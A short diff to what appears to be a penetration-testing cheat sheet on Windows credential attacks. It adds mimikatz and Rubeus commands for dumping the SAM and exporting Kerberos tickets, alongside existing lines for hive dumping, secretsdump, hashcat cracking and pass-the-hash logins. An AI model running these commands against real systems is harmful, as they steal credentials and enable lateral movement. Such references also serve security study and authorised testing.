@@ -55,6 +55,9 @@ reg.exe save hklm\security C:\security.save
 # Dumping hashes from the hives
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 
+# Using mimikatz
+lsadump::sam
+
 # Cracking hashes
 sudo hashcat -m 1000 hashes_file wordlist
 ```
@@ -173,6 +176,9 @@ xfreerdp  /v:$TARGET_IP /u:$USER /pth:$HASH
 # Extracting kerberos keys using mimikatz
 privilege::debug
 sekurlsa::ekeys
+# Extracting kerberos tickets
+sekurlsa::tickets /export
+Rubeus.exe dump /nowrap
 # Over Pass the hash
 sekurlsa::pth /user:$USERNAME /rc4 or /NTLM:$HASH /domain:$DOMMAIN /run:cmd.exe
 # Rubeus - Pass the Key or OverPass the Hash
